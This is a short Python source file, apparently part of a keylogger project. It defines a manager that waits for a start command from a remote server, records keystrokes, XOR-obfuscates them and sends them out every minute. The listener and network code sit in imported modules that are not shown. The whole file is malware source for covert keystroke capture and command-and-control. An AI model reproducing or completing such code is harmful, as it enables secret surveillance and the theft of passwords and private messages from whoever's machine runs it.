import time
from send_ping import SendPing
from send_data import SendData
from key_logger_service import KeyLoggerService
from encrypt import Encryption
from file_writer import FileWriter


class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()


    def start_key_logger(self):
        self.service.start_listener()
        while True:
            generator = self.service.send_every_minute()

            for data in generator:
                encrypted_data = Encryption(data).xor_encryption()
                server_commend = SendData(encrypted_data).send()
                if not server_commend:
                    self.service.stop_listener()
                    return False

    def start(self):
        is_listening = False
        while True:
            if not is_listening:
                commend_to_start = SendPing().send()
                if commend_to_start:
                    is_listening = self.start_key_logger()
            time.sleep(60)    
        
if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()
